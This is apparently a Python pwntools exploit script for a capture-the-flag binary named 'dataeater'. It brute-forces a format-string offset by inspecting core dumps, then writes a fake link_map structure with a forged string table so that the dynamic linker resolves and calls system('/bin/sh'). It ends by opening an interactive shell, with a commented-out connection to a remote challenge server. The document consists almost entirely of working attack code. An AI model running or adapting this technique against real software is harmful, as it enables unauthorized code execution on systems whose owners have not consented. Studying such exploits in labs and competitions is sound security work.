from pwn import *
import subprocess

exe = context.binary = ELF('./dataeater', checksec=False)
# context.log_level = 'debug'

def Bruteforce():
	link_map_pointer = 0x601008
	for x in range(1,99):
		print('--------------------------------------------')
		p = process('./dataeater')
		p.sendline(f"%s%{x}$s".encode())
		p.sendline(b'A'*8 + b' ' + b'B'*8 + b' ' + b'C')

		# Wait until it crash. Core file will be made after crash.
		# If it doesn't crash, check manually to make sure it crash
		p.wait()

		core = Coredump('./core')

		# Read 8 bytes from address of link_map_pointer
		link_map_addr = u64(core.read(link_map_pointer, 8))

		# Read all bytes at link_map_addr and stop at null byte 
		if b'BBBBBBBB' in core.string(link_map_addr):             
			print(x, hex(link_map_addr))
			print(core.string(link_map_addr))
			input()
		p.close()

def CheckWhitespace(payload):
	assert(b' ' not in payload)
	assert(b'\n' not in payload)
	assert(b'\r' not in payload)
	assert(b'\t' not in payload)

#################################################
### Stage 1: Get link_map format string offset ###
#################################################
if args.BRUTEFORCE:
	Bruteforce()
	exit()
####################################
### Stage 2: Create fake link_map ###
####################################
# Fake link_map struct (part 1) 

_ = """
# define DT_STRTAB        5
# define DT_SYMTAB        6
# define DT_JMPREL        23

type = struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
	struct libname_list *l_libname;
    Elf64_Dyn *l_info[77];
"""
buf_addr = 0x601080                    # global variable address

# Construct DT_STRTAB and STRTAB
DT_STRTAB_addr = buf_addr + 0x8
DT_STRTAB_struct = p64(0x5)
DT_STRTAB_struct += p64(buf_addr + 0x18 - 0x37)    # STRTAB_addr - st_name

STRTAB_addr = buf_addr + 0x18
STRTAB_struct = b'system\x00\x00'

buf_data = b'/bin/sh\x00'
buf_data += DT_STRTAB_struct
buf_data += STRTAB_struct

# Construct link_map
DT_SYMTAB = 0x600eb0

link_map_struct = p64(0)                   # l_addr
link_map_struct += p64(0)                  # l_name
link_map_struct += p64(0)                  # l_ld
link_map_struct += p64(0)                  # l_next
link_map_struct += p64(0)                  # l_prev
link_map_struct += p64(0)                  # l_real
link_map_struct += p64(0)                  # l_ns
link_map_struct += p64(0)                  # l_libname
link_map_struct += p64(0)                  # l_info[0]
link_map_struct += p64(0)                  # l_info[1]
link_map_struct += p64(0)                  # l_info[2]
link_map_struct += p64(0)                  # l_info[3]
link_map_struct += p64(0)                  # l_info[4]
link_map_struct += p64(DT_STRTAB_addr)     # l_info[DT_STRTAB]
link_map_struct += p64(DT_SYMTAB)          # l_info[DT_SYMTAB]

p = process('./dataeater')
# p = connect('mc.ax', 31869)

p.sendline(b'%s%32$s')
p.sendline(buf_data + b' ' + link_map_struct)

p.interactive()